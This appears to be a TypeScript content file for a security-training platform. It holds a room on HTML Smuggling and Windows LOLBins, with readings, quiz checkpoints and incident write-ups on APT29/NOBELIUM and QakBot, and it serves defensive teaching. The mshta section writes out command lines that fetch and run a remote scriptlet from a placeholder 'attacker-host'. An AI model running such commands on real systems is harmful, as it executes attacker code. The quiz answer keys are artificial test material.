/**
 * Learning Rooms -- Batch 49
 *
 * Closes a P2 coverage gap (topic 9 of 9, the last in this coverage pass):
 * HTML Smuggling and Signed-Binary Proxy Execution (LOLBins). Deepens the
 * execution/delivery layer of intrusion tradecraft beyond what this
 * platform's Modern Commodity Initial-Access Techniques room (batch 32)
 * already covers -- that room owns ClickFix, clipboard clippers, SEO
 * poisoning, the Mark-of-the-Web ISO bypass, and drive-by cryptomining in
 * depth; this room does not re-teach any of them, and cross-links to that
 * room explicitly wherever the two intersect (T1105, T1204.002, T1553.005).
 *
 * Rooms in this batch:
 *  1. html-smuggling-and-lolbins
 *
 * TECHNIQUES COVERED, verified directly against attack.mitre.org at write
 * time (2026-09-09):
 *   - T1027.006 -- Obfuscated Files or Information: HTML Smuggling,
 *     Stealth (TA0005). Sub-technique of T1027.
 *   - T1218.005 -- System Binary Proxy Execution: Mshta, Stealth
 *     (TA0005).
 *   - T1218.010 -- System Binary Proxy Execution: Regsvr32 ("Squiblydoo"),
 *     Stealth (TA0005).
 *   - T1218.011 -- System Binary Proxy Execution: Rundll32, Stealth
 *     (TA0005).
 *   - T1218.007 -- System Binary Proxy Execution: Msiexec, Stealth
 *     (TA0005).
 *   - T1127 -- Trusted Developer Utilities Proxy Execution, verified to
 *     carry TWO tactics: Execution (TA0002) AND Stealth (TA0005).
 *     Named as a sibling family (MSBuild, WinDbg/CDB, Tracker.exe) and
 *     NOT re-taught in depth.
 *   - T1105 -- Ingress Tool Transfer, cross-linked (owned in depth by
 *     rooms-batch-32.ts, Commodity Initial-Access).
 *   - T1204.002 -- User Execution: Malicious File, cross-linked (owned in
 *     depth by rooms-batch-32.ts).
 *
 * MITRE ATT&CK v19 tactic rename: as of v19 (released 28 April 2026),
 * TA0005 was renamed from "Defense Evasion" to "Stealth", with a new
 * sibling tactic "Defense Impairment" (TA0112) split off for techniques
 * that actively disable/degrade defensive tooling. The tactic ID TA0005
 * itself did NOT change. This room uses the v19 name "Stealth (TA0005)"
 * throughout its content and event mitre_tactic fields, matching the
 * platform-wide ATT&CK v19 update (src/lib/mitre/attack.ts and the other
 * rooms). hsl-r4's naming note teaches the rename and the TA0112 split
 * explicitly, so a student who meets the old name "Defense Evasion" in
 * older reports or vendor tooling can map it to TA0005 at once.
 *
 * REAL INCIDENTS covered, with technique(s) each maps to:
 *   - APT29/NOBELIUM (25-28 May 2021) -> T1027.006 (EnvyScout HTML
 *     Smuggling of an ISO) -> T1218.011 (NativeZone loaded via
 *     rundll32.exe) -> T1105 (VaporRage in-memory downloader), via
 *     Microsoft's own two 2021 blog posts.
 *   - QakBot (2022, shift observed 13 June 2022) -> T1027.006 (HTML
 *     Smuggling of a password-protected ZIP), following an earlier 2022
 *     pivot to ISO delivery after Microsoft's macro-blocking change, per
 *     eSentire's public writeup.
 *
 * The room's own log_analysis/analyst_choice pair is a FRESH fictional
 * scenario (Thornfield Logistics, employees r.esposito and a warehouse
 * SCCM deployment) built on genuine Sysmon Event ID 1 (Process Creation)
 * field names verified against scripts/log-field-registry.json's "sysmon"
 * vendor entry (winlog./winlog.event_data. prefixes, matching the existing
 * precedent in rooms-batch-42.ts). source:"sysmon" is used throughout (not
 * "edr"), so neither event is ingested by src/lib/edr/fromLiveStory.ts's
 * live-incident-simulation path (that path is reachable only from
 * src/app/(app)/dashboard/simData.ts via scenario-packs, which this room
 * does not touch) -- the EDR-console hash-registry coupling documented for
 * source:"edr" scenario-pack payloads does not apply to standalone Room
 * task content. it_verify_result/it_verify_message (never a raw field) is
 * the sanctioned FP-resolution mechanism for the analyst_choice control
 * case, exactly as used elsewhere on this platform. No raw field states a
 * conclusion (e.g. no invented "is_malicious" field) -- Signed/
 * SignatureStatus/Hashes are real, standard Sysmon Event ID 1 fields, and
 * a valid signature status on regsvr32.exe in the malicious case is
 * accurate (it genuinely is signed by Microsoft) and is used pedagogically
 * to reinforce that the signature itself is never the discriminator.
 *
 * SOURCES consulted directly for this content:
 *  - MITRE ATT&CK, T1027.006 HTML Smuggling
 *    (attack.mitre.org/techniques/T1027/006/)
 *  - MITRE ATT&CK, T1218 System Binary Proxy Execution and its
 *    sub-techniques .005/.007/.010/.011
 *    (attack.mitre.org/techniques/T1218/, /005/, /007/, /010/, /011/)
 *  - MITRE ATT&CK, T1127 Trusted Developer Utilities Proxy Execution
 *    (attack.mitre.org/techniques/T1127/)
 *  - MITRE ATT&CK, T1105 Ingress Tool Transfer
 *    (attack.mitre.org/techniques/T1105/)
 *  - MITRE ATT&CK, T1204.002 User Execution: Malicious File
 *    (attack.mitre.org/techniques/T1204/002/)
 *  - MITRE ATT&CK, TA0005 Stealth tactic page and TA0112 Defense Impairment
 *    (attack.mitre.org/tactics/TA0005/, /tactics/TA0112/) -- v19 rename
 *  - LOLBAS Project, Mshta/Regsvr32/Rundll32 binary pages
 *    (lolbas-project.github.io/lolbas/Binaries/Mshta/, /Regsvr32/,
 *    /Rundll32/)
 *  - Microsoft Security Blog, "New sophisticated email-based attack from
 *    NOBELIUM" (microsoft.com/en-us/security/blog/2021/05/27/
 *    new-sophisticated-email-based-attack-from-nobelium/)
 *  - Microsoft Security Blog, "Breaking down NOBELIUM's latest
 *    early-stage toolset" (microsoft.com/en-us/security/blog/2021/05/28/
 *    breaking-down-nobeliums-latest-early-stage-toolset/)
 *  - eSentire, "Qakbot and HTML Smuggling Resurgence"
 *    (esentire.com/blog/qakbot-and-html-smuggling-resurgence)
 *  - MITRE CAR-2019-04-003, Squiblydoo detection analytic
 *    (car.mitre.org/analytics/CAR-2019-04-003/)
 */

export const roomsBatch49 = [
  {
    "id": "html-smuggling-and-lolbins",
    "title": "HTML Smuggling and LOLBins: When Trusted Binaries Do the Attacker's Work",
    "description": "Two of the most consistently effective evasion techniques in modern intrusions never touch a single unsigned or unknown file. HTML Smuggling (MITRE ATT&CK T1027.006) builds the actual malicious payload inside the victim's own browser, using ordinary JavaScript, so nothing resembling a malicious file ever crosses a network gateway for a proxy or sandbox to inspect. System Binary Proxy Execution (T1218 and its siblings -- Mshta, Regsvr32, Rundll32, Msiexec) then runs the attacker's code through a Windows binary that is already digitally signed by Microsoft and already allowlisted by policy, so the process a defender's console shows is a trusted name, not a suspicious one. This room follows both techniques end to end: how HTML Smuggling is actually built (Blobs, Data URLs, the download attribute) through real APT29/NOBELIUM (2021) and QakBot (2022) campaigns; how each major LOLBin (Living-Off-the-Land Binary) is abused, with the real command syntax attackers use and the real threat groups documented running it; the parent-process and command-line tells that separate an attacker's proxy execution from the identical binary's completely ordinary, constant, legitimate use; and the correlation logic and false-positive discipline a detection engineer needs to turn that distinction into a rule that fires on the right ten cases a year, not the wrong ten thousand.",
    "difficulty": "advanced" as const,
    "category": "Threat Detection",
    "estimatedMinutes": 95,
    "xp": 285,
    "icon": "🎭",
    "prerequisites": [
      "commodity-initial-access",
      "windows-fundamentals"
    ],
    "tasks": [
      {
        "type": "reading" as const,
        "id": "hsl-r0",
        "heading": "What Is a LOLBin? Trusted Binaries as an Attacker's Proxy",
        "content": "Every Windows installation ships with a large set of small, general-purpose utility programs that IT administrators, installers, and Windows itself rely on constantly: tools that register software components, run installer packages, execute lightweight scripts, or manage system configuration. Security researchers have a name for the subset of these built-in, legitimate, almost always digitally-signed executables that can *also* be abused to run an attacker's own code instead of their intended job: a **LOLBin**, short for **Living-Off-the-Land Binary**. The wider LOLBAS project (lolbas-project.github.io), a public, community-maintained catalogue, documents hundreds of these binaries, scripts, and libraries across Windows, along with the exact abuse syntax for each.\n\n### Two Concepts Worth Defining Before Anything Else\n\nA **digital signature** is a cryptographic guarantee, checked by Windows and by most security tools, that a file was published by a specific, verifiable vendor (in this case, Microsoft) and has not been tampered with since. **Application allowlisting** (sometimes called application whitelisting) is a security control that only permits pre-approved binaries to execute at all, blocking everything else by default -- a strong control against unknown malware, precisely because it flips the usual model from 'block known-bad' to 'allow only known-good.'\n\n### Why LOLBins Defeat Both Controls at Once\n\nA LOLBin does not defeat application allowlisting by sneaking past it as an unapproved file -- it defeats allowlisting by *being* the approved file. `regsvr32.exe`, `mshta.exe`, `rundll32.exe`, and `msiexec.exe` are not malware; they are core, digitally-signed, Microsoft-published components of Windows itself, and virtually every allowlisting policy on earth permits them to run, because blocking them would break normal system operation. The attacker's actual malicious content -- a remote script, a malicious DLL's exported function, an MSI package with an embedded custom action -- is not the file that gets evaluated for trust at all. The trusted binary is what launches; the untrusted logic rides along as an argument, a registry-free COM scriptlet, or a payload the trusted binary is told to fetch and run.\n\n### Why Signature-Based Antivirus Also Struggles\n\nTraditional antivirus scanning relies heavily on matching a file against a database of known-malicious file signatures. A LOLBin attack frequently introduces **no new executable file at all** -- `regsvr32.exe` on the disk of an attacked machine is byte-for-byte identical to `regsvr32.exe` on every other Windows machine on earth, because it is. There is nothing novel to fingerprint. The only artifact that differs from a benign run is *what the trusted binary was told to do* -- captured in the command line and in what happens next, not in the hash of the binary itself.\n\n### MITRE ATT&CK's Name for the Whole Family: System Binary Proxy Execution\n\nMITRE ATT&CK tracks this entire category under `T1218`, **System Binary Proxy Execution**, filed under the Stealth tactic (`TA0005`, called Defense Evasion before ATT&CK v19) -- the adversary's goal here is specifically to avoid detection by proxying execution through something a defender already trusts. `T1218` has fourteen documented sub-techniques, one per commonly-abused binary; this room covers the four with by far the deepest real-world abuse history: `T1218.005` (Mshta), `T1218.007` (Msiexec), `T1218.010` (Regsvr32), and `T1218.011` (Rundll32).",
        "checkpoint": {
          "question": "Per this reading, why does a LOLBin defeat application allowlisting rather than being blocked by it?",
          "options": [
            "Because the LOLBin is itself the pre-approved, signed file the policy was built to permit, and the untrusted logic rides along as an argument or fetched payload",
            "Because allowlisting checks only a file’s digital signature, and the attacker’s fetched scriptlet is covered by Microsoft’s signature along with the binary",
            "Because these utilities always run with SYSTEM privileges, and allowlisting policies by design never evaluate processes running at the SYSTEM level",
            "Because allowlisting blocks only files carrying a Mark-of-the-Web flag, and built-in Windows binaries never arrive with that download flag set"
          ],
          "answer": 0,
          "explanation": "This reading states the mechanism directly: the LOLBin is genuinely the approved file, and the malicious content is carried as an argument, a scriptlet, or a fetched payload rather than as the binary being evaluated. The signature idea confuses allowlisting with signature-checking: the fetched scriptlet is not covered by the binary’s Microsoft signature, so “the scriptlet is signed along with the binary” is wrong. LOLBins run at the caller’s own integrity level, not automatically as SYSTEM, and allowlisting applies regardless of privilege, so the SYSTEM-exemption claim is wrong. Mark-of-the-Web is a download tag unrelated to how allowlisting decides what may run, so that option conflates two separate controls."
        },
        "xp": 5
      },
      {
        "type": "reading" as const,
        "id": "hsl-r1",
        "heading": "HTML Smuggling: Building the Payload Inside the Victim's Own Browser",
        "content": "Every network-based content inspection control -- a secure email gateway (SEG) scanning attachments, a web proxy scanning downloads, a sandbox detonating suspicious files -- shares one assumption: that the malicious file crosses the wire as a recognizable file, at some point, for the control to look at. **HTML Smuggling**, tracked by MITRE ATT&CK as `T1027.006` (a sub-technique of `T1027`, Obfuscated Files or Information, under the Stealth tactic `TA0005`), is built specifically to violate that assumption.\n\n### The Mechanism, Piece by Piece\n\nA **Blob** (Binary Large Object) is a JavaScript object representing raw, file-like data held in a browser's memory -- not a file on disk, just bytes the browser is willing to treat as one. A **Data URL** is a way of embedding a small file's entire content directly inside a URL string itself, rather than pointing to a separate resource. The HTML5 `download` attribute on an `<a>` (anchor/link) tag tells the browser: when this link is activated, save the resulting content to disk as a file, using the given filename, instead of navigating to it.\n\nHTML Smuggling combines all three. The attacker embeds the entire malicious payload -- an ISO, a ZIP, or an executable -- directly inside the HTML page's own JavaScript source, usually obfuscated (encoded, sometimes further scrambled with a simple cipher) so it does not resemble the target file type as plain text. When the victim's browser loads that HTML page -- delivered as an email attachment or a link -- the embedded JavaScript runs locally, decodes the obfuscated string, constructs a Blob from the resulting bytes, and triggers a download using the `download` attribute (or a synthetic click on a hidden link). The malicious file materializes on the victim's disk only at that final moment, assembled entirely inside the browser's own memory.\n\n### Why This Specifically Evades Network Inspection\n\nA secure email gateway or web proxy inspecting the HTML page in transit sees exactly one thing: an HTML document, a MIME type universally treated as low-risk, containing text and script -- not a distinguishable ISO, EXE, or ZIP signature anywhere in the bytes that actually crossed the network. The dangerous content only becomes a file *after* it has already passed every network chokepoint a defender controls, reconstructed locally by code the browser was always going to execute anyway. A sandbox that only detonates attachments by file type, without actually rendering the HTML and running its script, never sees the payload appear at all.\n\n### Not the Same Layer as a Mark-of-the-Web Bypass\n\nThis platform's Modern Commodity Initial-Access Techniques room covers, in depth, what happens once a downloaded ISO lands on disk and is opened -- specifically `T1553.005`, Subvert Trust Controls: Mark-of-the-Web Bypass, the reason a shortcut *inside* a mounted ISO container can run with no SmartScreen warning even though the ISO itself was flagged as downloaded from the internet. That is a **post-landing** technique: it assumes the file already made it past the network layer intact. HTML Smuggling operates one layer earlier -- it is how the file gets *past* the network layer in the first place, undetected, before Mark-of-the-Web or SmartScreen ever get a chance to matter. A single real intrusion, covered in this room's next reading, uses both layers back to back: HTML Smuggling to deliver an ISO, and then exactly the Mark-of-the-Web gap this platform's other room covers to let that ISO's contents run.",
        "checkpoint": {
          "question": "Per this reading, what specifically does a secure email gateway or web proxy see when an HTML-smuggled attachment crosses the network, and why does that matter?",
          "options": [
            "It sees only an ordinary HTML document with script, a low-risk MIME type, because the payload file is assembled from a decoded Blob in the browser only after the page has passed the inspection point",
            "It sees the fully formed payload file as it will land on disk, but gateways do not scan container formats such as ISO or ZIP by default, which this reading names as the real gap",
            "It sees an encrypted TLS session it cannot read, which this reading gives as the single reason the technique succeeds against every gateway configuration",
            "It sees a Mark-of-the-Web flag on the HTML file itself, which this reading says is what suppresses the gateway’s scanning of that message"
          ],
          "answer": 0,
          "explanation": "This reading is explicit: the network-crossing artifact is an ordinary HTML document with script, not a recognizable payload file type, the payload only becomes a file locally, in the browser, after the network chokepoint. The container-scanning option is wrong because the gateway never receives a container file at all to scan; the point is that nothing file-shaped crosses the wire, not that ISO/ZIP scanning is skipped. TLS encryption is not the mechanism this reading describes, so the “undecryptable TLS” explanation is invented. Mark-of-the-Web is a Windows download tag relevant after a file lands on disk, not something that suppresses gateway inspection, so that option confuses the two layers this reading separates."
        },
        "xp": 5
      },
      {
        "type": "reading" as const,
        "id": "hsl-r2",
        "heading": "Real Incident: APT29/NOBELIUM's EnvyScout-to-NativeZone Chain (2021)",
        "content": "On 25 May 2021, the threat actor Microsoft tracks as **NOBELIUM** (the same actor behind the 2020 SolarWinds/SUNBURST compromise, publicly attributed to Russia's SVR and separately tracked by other researchers as APT29) launched a large phishing campaign against roughly 3,000 individual email accounts across more than 150 organizations -- government agencies, think tanks, consultants, and non-governmental organizations, concentrated in the United States. The emails appeared to come from the U.S. Agency for International Development (USAID), because NOBELIUM had genuinely compromised USAID's account with Constant Contact, a legitimate email marketing service USAID actually used -- so the messages passed through real, previously-trusted infrastructure. Microsoft published a detailed technical breakdown of the toolset on 28 May 2021.\n\n### Stage 1: EnvyScout -- HTML Smuggling in Practice\n\nThe email pointed victims to a malicious HTML file Microsoft calls **EnvyScout**. Technically, EnvyScout XORs (a simple reversible cipher, combining each byte with a single-byte key) the payload, producing a Base64-encoded string embedded in the page's own JavaScript. When the victim's browser opened the file, that script decoded the string, reconstructed the bytes as a Blob, and wrote the result to disk as an ISO file named `NV.img` -- exactly the HTML Smuggling mechanism this room's previous reading described, using a technique nearly identical to legitimate open-source libraries such as FileSaver.js repurposed for malicious ends.\n\n### Stage 2: The Victim Opens the ISO, and BoomBox Runs\n\nOnce the victim double-clicked the downloaded ISO, Windows mounted it as a virtual drive, and a shortcut inside launched **BoomBox**, a downloader that profiled the host, AES-encrypted the resulting data, and uploaded it to an actor-controlled Dropbox account -- then used a hardcoded Dropbox access token to pull down the next-stage payload from that same Dropbox account.\n\n### Stage 3: NativeZone -- Where LOLBin Abuse Enters the Chain\n\nThe payload BoomBox retrieved was **NativeZone** (`NativeCacheSvc.dll`), a malicious loader -- and Microsoft's own writeup states plainly that NativeZone is loaded and run using `rundll32.exe`, exactly the `T1218.011` System Binary Proxy Execution abuse this room covers in depth two readings ahead. This is the single detail that ties both halves of this room's subject together inside one real, high-profile intrusion: HTML Smuggling got the payload past the network gateway; a LOLBin then ran the next stage in a way designed to blend into ordinary `rundll32.exe` activity.\n\n### Stage 4: VaporRage -- Fully In-Memory\n\nNativeZone's job was to load **VaporRage** (`CertPKIProvider.dll`), a shellcode downloader capable of running entirely in memory, re-checking for new instructions from its command-and-control infrastructure roughly once an hour, and executing whatever shellcode payload it receives without ever writing that final payload to disk as its own file.\n\n### Why This One Chain Matters to This Room\n\nAn analyst who only understands HTML Smuggling in isolation would stop investigating the moment EnvyScout's ISO was identified. An analyst who understands the full chain knows to look one hop further -- for exactly the `rundll32.exe` proxy-execution pattern NativeZone represents -- because that is where a real, documented APT29/NOBELIUM intrusion actually continued.",
        "checkpoint": {
          "question": "Per this reading, at which specific stage of the NOBELIUM chain does System Binary Proxy Execution (a LOLBin) first appear, and which binary is it?",
          "options": [
            "Stage 3, NativeZone, Microsoft’s write-up states this loader is run through rundll32.exe, the first point where a trusted signed binary proxies the code",
            "Stage 1, EnvyScout: the HTML file is run through mshta.exe, which this reading gives as the first trusted-binary proxy step in the chain",
            "Stage 2, BoomBox: the downloader is launched through regsvr32.exe before it profiles the host, according to this reading",
            "Stage 4, VaporRage: the in-memory downloader runs through msiexec.exe, which this reading names as the first proxy-execution step"
          ],
          "answer": 0,
          "explanation": "This reading states it directly: NativeZone (Stage 3) is loaded and run through rundll32.exe, and that is where System Binary Proxy Execution first enters the chain. EnvyScout (Stage 1) is an HTML file opened by the browser, not run through mshta.exe, so that option is invented. BoomBox (Stage 2) is described as a downloader that profiles the host and exfiltrates to Dropbox, with no regsvr32.exe role, so that option is invented. VaporRage (Stage 4) is a shellcode downloader, not something launched through msiexec.exe, and it comes after Stage 3, so it cannot be the first proxy step."
        },
        "xp": 5
      },
      {
        "type": "reading" as const,
        "id": "hsl-r3",
        "heading": "Real Incident: QakBot's HTML-Smuggling Evolution (2022)",
        "content": "QakBot (also known as QBot, QuackBot, and Pinkslipbot), an information-stealing malware family active since 2008 and historically delivered through malicious Office macro documents, changed its delivery method during 2022 in a way that tracks directly with this room's subject.\n\n### From Macro Documents to Container Files\n\nMicrosoft's default decision, announced in 2022, to block Office macros originating from the internet by default forced a wide range of malware families -- QakBot prominent among them -- away from the macro-document delivery this platform's other rooms cover, and toward container files (ISO, ZIP, IMG) that Windows historically did not flag with the same warning a raw executable receives. Early 2022 QakBot campaigns delivered a malicious ISO directly as an email attachment: mounting it revealed a shortcut (`.lnk`) file disguised with a PDF icon, which, when clicked, launched the actual infection.\n\n### The June 2022 Shift to HTML Smuggling\n\nOn 13 June 2022, public reporting from security researchers observed QakBot's delivery mechanism change again: rather than attaching the ISO directly, the campaign began attaching an HTML file that used HTML Smuggling to construct a password-protected ZIP archive -- containing that same disguised shortcut -- entirely inside the victim's browser, exactly as this room's earlier reading described the mechanism working. Some observed variants encoded the embedded payload as Base64 alongside an innocuous decoy image (such as an Adobe-branded graphic) to make the surrounding HTML source look even less remarkable to a cursory review.\n\n### Why the Extra Step (Password-Protected ZIP) Matters\n\nA password-protected archive adds a second, independent layer of evasion on top of HTML Smuggling itself: even a security tool sophisticated enough to detonate the reconstructed ZIP file in an automated sandbox cannot open a password-protected archive without the password -- which the campaign's own email or landing page supplies to the human victim, but never to an automated scanner. This combination (smuggle the file past the network layer, then require a password no automated tool has, to open it) is a recurring pattern worth recognizing across multiple malware families, not just QakBot.\n\n### The Professional Takeaway\n\nQakBot's 2022 pivot illustrates something this room returns to repeatedly: HTML Smuggling is not a single malware family's signature trick, tied to one actor. It is a general-purpose evasion technique that an active, financially-motivated, high-volume malware operation adopted specifically *because* a major vendor's own defensive change (blocking internet-sourced macros) closed off its previous delivery method. Detection built around one family's specific ISO or macro pattern will always eventually be evaded by the next family's pivot to the same generic underlying technique -- which is exactly why this room teaches HTML Smuggling and LOLBin abuse as mechanisms, not as a list of named malware to watch for.",
        "checkpoint": {
          "question": "Per this reading, why did QakBot -- and a wide range of other malware families -- shift delivery away from Office macro documents during 2022?",
          "options": [
            "Microsoft’s 2022 decision to block internet-sourced Office macros by default closed off the prior route, pushing these families toward container files and, from June 2022, HTML Smuggling",
            "Email gateways began stripping all Office attachments outright in 2022, so families moved to HTML because it was the only attachment type still permitted to arrive",
            "Windows stopped allowing macros to run on any newly sold device in 2022, so delivery had to shift to a file type that did not depend on macros at all",
            "A 2022 Windows update removed the Office applications’ scripting engine entirely, leaving smuggled HTML as the only remaining way to run embedded code"
          ],
          "answer": 0,
          "explanation": "This reading names the cause directly: Microsoft’s default macro-blocking change closed off the prior delivery route, and container files followed by HTML Smuggling filled the gap. Gateways did not begin stripping all Office attachments (ordinary documents still flow through mail) so that option overstates the change. The macro-block was a default on internet-sourced documents, not a hardware-level ban on all macros on new devices, so that option misstates the scope. No update removed the Office scripting engine; macros still run, they are just blocked by default when the file came from the internet, so that option is invented."
        },
        "xp": 5
      },
      {
        "type": "question" as const,
        "id": "hsl-q1",
        "question": "An analyst is asked to explain, in one sentence, the actual difference between HTML Smuggling (T1027.006) and a Mark-of-the-Web bypass (T1553.005) as this room's readings describe them. Which explanation is correct?",
        "options": [
          "HTML Smuggling gets the file past network inspection by assembling it inside the browser; a Mark-of-the-Web bypass lets that file's contents run from disk without the internet-download warning",
          "HTML Smuggling strips the Zone.Identifier stream so SmartScreen stays silent; a Mark-of-the-Web bypass assembles the payload inside the browser to evade gateway inspection",
          "HTML Smuggling evades only the email gateway's attachment scanner, while a Mark-of-the-Web bypass evades only proxy-level download inspection, so they are alternatives for one delivery stage",
          "A Mark-of-the-Web bypass is the first delivery stage, getting the container past SmartScreen, and HTML Smuggling then runs the payload from inside that container"
        ],
        "answer": 0,
        "explanation": "This room's HTML Smuggling reading is explicit about this exact distinction: HTML Smuggling operates at the network-delivery layer, before Mark-of-the-Web or SmartScreen get a chance to matter; the Mark-of-the-Web bypass this platform's Commodity Initial-Access room covers operates after the file has already landed. The Zone.Identifier stream is applied when the browser writes the file, and HTML Smuggling does not remove it -- the two techniques act at different layers, with different jobs (the option that has HTML Smuggling stripping Zone.Identifier swaps them). Nor do they split one stage between the email gateway and the proxy as alternatives, and making the Mark-of-the-Web bypass the first stage reverses the order: smuggling comes first, since the file must be delivered before any warning could be bypassed.",
        "xp": 25
      },
      {
        "type": "reading" as const,
        "id": "hsl-r4",
        "heading": "The System Binary Proxy Execution Family: T1218 and Its Neighbors",
        "content": "MITRE ATT&CK's `T1218`, System Binary Proxy Execution, currently documents fourteen sub-techniques -- one per commonly-abused signed Windows binary. The table below covers the four this room studies in depth, plus one closely-related sibling technique this room mentions but does not re-teach in full.\n\n| Technique ID | Binary / Family | What It's Meant to Do | Tactic |\n|---|---|---|---|\n| T1218.005 | mshta.exe | Run HTML Applications (.hta) | Stealth (TA0005) |\n| T1218.007 | msiexec.exe | Install/repair Windows Installer (.msi) packages | Stealth (TA0005) |\n| T1218.010 | regsvr32.exe | Register/unregister COM DLLs | Stealth (TA0005) |\n| T1218.011 | rundll32.exe | Run a named function exported by a DLL | Stealth (TA0005) |\n| T1127 | Trusted developer utilities (MSBuild, WinDbg/CDB, Tracker.exe, and others) | Compile, debug, or build software | Execution (TA0002) AND Stealth (TA0005) |\n\n### Why T1127 Is Listed Here But Not Taught In Depth\n\n`T1127`, Trusted Developer Utilities Proxy Execution, is the sibling family this room does not dive into: legitimate developer and debugging tools -- `MSBuild.exe` (Microsoft's build engine, which can compile and execute arbitrary inline C# embedded in a project file), `WinDbg`/`CDB` (Windows debuggers), and `Tracker.exe` (a build-logging utility) -- carry the same signed-and-trusted status this room's four core binaries carry, and can be abused the same way. MITRE lists `T1127` under **two** tactics at once, Execution (`TA0002`) *and* Stealth (`TA0005`): running code through a developer tool is simultaneously how the code executes at all (Execution) and how it does so while looking like a routine build or debug process rather than a suspicious one (Stealth) -- the same dual-purpose logic this room's four core LOLBins all share, even though `T1218` itself is filed under Stealth alone.\n\n### A Naming Note Worth Knowing\n\nUntil ATT&CK version 19 (released 28 April 2026), `TA0005` was called **Defense Evasion**. Version 19 renamed it to **Stealth** and split it in two. `TA0005` Stealth keeps the techniques whose goal is to stay unseen: hiding how a payload is built, masquerading, blending a malicious process in with a trusted one. A brand-new sibling tactic, **Defense Impairment** (`TA0112`), takes the techniques whose goal is to directly break or degrade a defender's tools: stopping an EDR agent, turning off or clearing logs, weakening a firewall or an authentication control (for example `T1685` Disable or Modify Tools, formerly part of `T1562` Impair Defenses). The tactic ID `TA0005` itself did not change -- only its name and its scope did. Every technique this room covers hides or blends rather than breaks anything, so all of them sit in Stealth, and this room uses that name throughout. You will still meet the old name in older threat reports, detection rules, and some vendor consoles; when a source says 'Defense Evasion (TA0005)', read it as Stealth, and check whether the specific technique moved to Defense Impairment in v19. The tactic ID is the reliable anchor, because the name changed and the ID did not.\n\n### Why All Four Core Binaries Share One Underlying Shape\n\nEach of `T1218.005`, `.007`, `.010`, and `.011` follows the identical logical pattern this room's first reading described in general terms: a signed, allowlisted, everyday Windows utility accepts an argument telling it what to do, and that argument can point at attacker-supplied logic instead of the mundane task the binary was built for. The next three readings work through each binary's specific abuse syntax and real-world usage in turn.",
        "checkpoint": {
          "question": "Per this reading, why does T1127 (Trusted Developer Utilities Proxy Execution) carry TWO tactics at once, while T1218 (System Binary Proxy Execution) carries only Stealth?",
          "options": [
            "Running code through a developer tool is at once how the code executes (TA0002) and how it blends in as a routine build/debug process (TA0005): a dual purpose T1218 shares but is not formally tagged for",
            "T1127 covers newer binaries than T1218 does, and MITRE assigns two tactics to any technique added to the framework after a certain release to mark it as recently documented",
            "T1218’s sub-techniques are detected only by endpoint tools while T1127’s are detected only on the network, and MITRE assigns tactic counts according to where a technique is detected",
            "T1127 requires local administrator rights whereas T1218’s sub-techniques do not, and MITRE doubles the tactic count of any technique that needs elevated privileges to run at all"
          ],
          "answer": 0,
          "explanation": "This reading states the reasoning directly, and is explicit that this is a formal-tagging distinction rather than a claim that T1218’s sub-techniques lack an execution purpose. Tactic assignment reflects an attacker’s goal, not how recently a technique was added, so the “added after a certain release” rule is invented. Tactic assignment also has nothing to do with whether detection is endpoint- or network-based, so that option invents a rule MITRE does not use. Privilege requirements do not drive tactic counts either, and these developer tools do not uniformly require administrator rights, so the elevated-privileges rule is invented."
        },
        "xp": 5
      },
      {
        "type": "reading" as const,
        "id": "hsl-r5",
        "heading": "Mshta.exe: Running HTML Applications as a Proxy (T1218.005)",
        "content": "`mshta.exe` is a legitimate Windows utility whose entire purpose is executing **HTML Applications** (`.hta` files) -- HTML documents with embedded VBScript or JavaScript, run with far broader system privileges than a script would ever get inside a normal browser tab, specifically because `mshta.exe` runs outside Internet Explorer's browser security sandbox entirely.\n\n### The Abuse Syntax, Verified Against the LOLBAS Project\n\nThe LOLBAS project documents several concrete abuse patterns for `mshta.exe`, all filed under `T1218.005`:\n\n- Running a local or downloaded `.hta` file directly: `mshta.exe C:\\Users\\Public\\update.hta`\n- Running VBScript that fetches and executes a remote `.sct` COM scriptlet: `mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:http://attacker-host/payload.sct\"\")\"))`\n- The equivalent using JavaScript: `mshta.exe javascript:a=GetObject(\"script:http://attacker-host/payload.sct\").Exec();close();`\n- Using `mshta.exe` purely as a downloader, fetching a remote file to the local INetCache folder without necessarily executing it as an HTA at all -- this specific pattern is tagged with a second technique, `T1105`, Ingress Tool Transfer (covered in depth by this platform's Commodity Initial-Access room), because the point of that invocation is fetching a follow-on file, not running HTML content.\n\n### Real-World Groups Documented Using This Exact Technique\n\nMITRE ATT&CK's own procedure examples for `T1218.005` name several distinct threat actors: **APT29** (the same actor behind the NOBELIUM chain this room's earlier reading covered) has used `mshta.exe` to execute malicious scripts on compromised hosts; **FIN7**, a financially-motivated group known for point-of-sale and retail-sector intrusions, used `mshta.exe` to execute VBScript for code deployment; **Lazarus Group** (attributed to North Korea) used it to execute HTML pages downloaded via initial-access documents; **MuddyWater** ran its POWERSTATS payload through `mshta.exe`; and **Gamaredon Group**, an espionage-focused actor, has used it to execute malicious files in its operations.\n\n### Why the Command Line, Not the Binary, Is the Tell\n\nEvery one of the abuse patterns above shares a structural feature: the actual malicious action is entirely visible inside the argument `mshta.exe` was launched with -- a URL, a `vbscript:` or `javascript:` prefix, or a reference to a `.sct` file -- while the process name itself is the completely unremarkable, digitally-signed `mshta.exe` every Windows machine already has. An analyst who filters only on process name will never distinguish a legitimate internal HTA-based tool from an attacker's command; an analyst who reads the command line will see the difference immediately, because a legitimate local HTA invocation names a local file path, while these abuse patterns name a remote URL, an inline script protocol handler, or both.",
        "checkpoint": {
          "question": "Per this reading, when mshta.exe runs with a script-protocol argument (a javascript: or vbscript: prefix) that pulls a remote .sct scriptlet from a URL, what makes it identifiable as abuse rather than ordinary HTA usage?",
          "options": [
            "The command line itself (a script-protocol prefix paired with a remote URL fetching a scriptlet) rather than the ordinary pattern of naming a local .hta file path",
            "The process name mshta.exe on its own, since a legitimate internal HTA tool would always launch mshta.exe under a different, renamed executable instead",
            "The medium integrity level of the process, since this reading states a genuine HTA invocation always runs at high integrity and abuse always runs lower",
            "The parent process being explorer.exe, since this reading states a legitimate HTA is only ever launched directly by the Windows service host, never by the shell"
          ],
          "answer": 0,
